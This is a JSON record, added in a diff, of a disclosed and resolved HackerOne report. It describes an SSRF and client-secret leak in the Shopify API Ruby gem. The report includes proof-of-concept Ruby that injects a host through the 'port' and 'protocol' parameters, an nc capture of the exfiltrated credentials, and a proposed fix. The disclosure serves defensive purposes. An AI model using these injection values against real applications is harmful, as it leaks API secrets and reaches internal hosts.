@@ -1,0 +1,123 @@
+{
+  "id": 423437,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjM0Mzc=",
+  "url": "https://hackerone.com/reports/423437",
+  "title": "H1514 Shopify API ruby SDK session setup lacks input validation, resulting in SSRF and leakage of client secret",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2018-10-13T18:08:20.646Z",
+  "submitted_at": "2018-10-13T18:08:20.646Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-04-05T13:44:34.501Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-04-04T21:47:26.715Z",
+  "team_member_agreed_on_going_public_at": "2019-04-05T13:44:34.351Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi team,\n\nThe [Shopify API ruby SDK](https://github.com/shopify/shopify_api) has the ability for the developer to interact with their shop's REST API. When setting up the gem, a code structure similar to the one below may be used to set up the connection:\n\n```ruby\nrequire 'shopify_api'\n\nclass SomeController < ApplicationController\n  def index\n    ShopifyAPI::Session.setup secret: '<secret>'\n\n    session = ShopifyAPI::Session.new('some-shop.myshopify.com')\n\n    access_token = session.request_token(params)\n  end\nend\n```\n\nWhen the `ShopifyAPI::Session` class is initialized, the following code is executed:\n\n```ruby\ndef prepare_url(url)\n  return nil if url.blank?\n  # remove http:// or https://\n  url = url.strip.gsub(/\\Ahttps?:\\/\\//, '')\n  # extract host, removing any username, password or path\n  shop = URI.parse(\"https://#{url}\").host\n  # extract subdomain of .myshopify.com\n  if idx = shop.index(\".\")\n    shop = shop.slice(0, idx)\n  end\n  return nil if shop.empty?\n  shop = \"#{shop}.#{myshopify_domain}\"\n  port ? \"#{shop}:#{port}\" : shop\nrescue URI::InvalidURIError\n  nil\nend\n```\n\nAt the bottom, right above the `rescue` keyword, it can be observed that if a port is given, it is appended to the shop URL. This means that if the `setup` method is invoked with a `port` parameter, it'll be appended after the parsed hostname. Here is an example:\n\n```\n[1] pry(main)> require 'shopify_api'\n=> true\n[2] pry(main)> ShopifyAPI::Session.setup port: '80', secret: ''\n=> {:port=>\"80\", :secret=>\"\"}\n[3] pry(main)> session = ShopifyAPI::Session.new(\"test.myshopify.com\")\n=> #<ShopifyAPI::Session:0x00007fc5b2051070 extra={}, token=nil, url=\"test.myshopify.com:80\">\n```\n\nAs can be seen above, the resulting instance variable called `url` now contains the given `port` value. When the `request_token` method is called, the following code gets executed:\n\n```ruby\ndef access_token_request(code)\n  uri = URI.parse(\"#{protocol}://#{url}/admin/oauth/access_token\")\n  https = Net::HTTP.new(uri.host, uri.port)\n  https.use_ssl = true\n  request = Net::HTTP::Post.new(uri.request_uri)\n  request.set_form_data({\"client_id\" => api_key, \"client_secret\" => secret, \"code\" => code})\n  https.request(request)\nend\n```\n\nThe problem that arises here, is that the URL gets parsed a second time and then uses the parsed information from the newly constructed URL instead of what the class was initialized with. This allows an attacker to inject an arbitrary domain through the `port` and `protocol` parameter when calling the `setup` method. An example:\n\n```ruby\nrequire 'shopify_api'\n\nShopifyAPI::Session.setup protocol: 'https', secret: '', port: '@127.0.0.1/?'\n\nsession = ShopifyAPI::Session.new('some-shop.myshopify.com')\n\naccess_token = session.request_token({'hmac' => 'd54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815', 'timestamp': '2000000000'})\n```\n\nThe code above will exfiltrate the `client_secret`, `client_id`, and `code` to `127.0.0.1:443`. An excerpt of the captured request can be found below. The `hmac` above is a valid signature for the given timestamp (in a far distant future) and an empty secret.\n\n```\n$ nc -l -n -vv -p 443\nListening on [0.0.0.0] (family 0, port 443)\nConnection from [127.0.0.1] port 443 [tcp/*] accepted (family 2, sport 60286)\nPOST /?/admin/oauth/access_token HTTP/1.1\nHost: 127.0.0.1:443\nConnection: Keep-Alive\nAccept-Encoding: gzip\nContent-Length: 29\nAccept: */*\nUser-Agent: Ruby\nContent-Type: application/x-www-form-urlencoded\n\nclient_id&client_secret=&code\n```\n\nThe same can be achieved with the `protocol` parameter:\n\n```ruby\nShopifyAPI::Session.setup protocol: 'https://127.0.0.1/?', secret: ''\n\nsession = ShopifyAPI::Session.new('some-shop.myshopify.com')\n\naccess_token = session.request_token({'hmac' => 'd54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815', 'timestamp': '2000000000'})\n```\n\n## Impact\n\nThis vulnerability can only be exploited if an attacker can influence the `port` or `protocol` parameter when given to the `setup` method. This seems to be rather unlikely to happen. However, I don't believe that the usage of a Gem should unnecessarily expose the user to arbitrary security vulnerabilities. Given that this may impact their local network and may leak their API keys, I decided to bring this to your attention.\n\nHere's what a fix could look like:\n\n```diff\ndiff --git a/lib/shopify_api/session.rb b/lib/shopify_api/session.rb\nindex 937bbd0..bd8fdaf 100644\n--- a/lib/shopify_api/session.rb\n+++ b/lib/shopify_api/session.rb\n@@ -16,7 +16,18 @@ module ShopifyAPI\n     class << self\n\n       def setup(params)\n-        params.each { |k,value| public_send(\"#{k}=\", value) }\n+        params.each do |key, value|\n+          case key\n+          when 'port', :port\n+            sanitized_value = value.to_i\n+          when 'protocol', :protocol\n+            sanitized_value = protocol =~ /\\Ahttps?\\Z/ ? protocol : 'https'\n+          else\n+            sanitized_value = value\n+          end\n+\n+          public_send(\"#{key}=\", sanitized_value)\n+        end\n       end\n\n       def temp(domain, token, &block)\n```",
+  "weakness": {
+    "id": 107,
+    "name": "Improper Input Validation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 11,
+  "voters": [
+    "drsniper",
+    "mik317",
+    "eveeez",
+    "khalidamin",
+    "cr4xerbik4sh",
+    "cryptographer",
+    "sinswriter",
+    "mysteriousm",
+    "reddmist",
+    "nelyj",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 10803,
+    "asset_type": "OTHER",
+    "asset_identifier": "Other",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
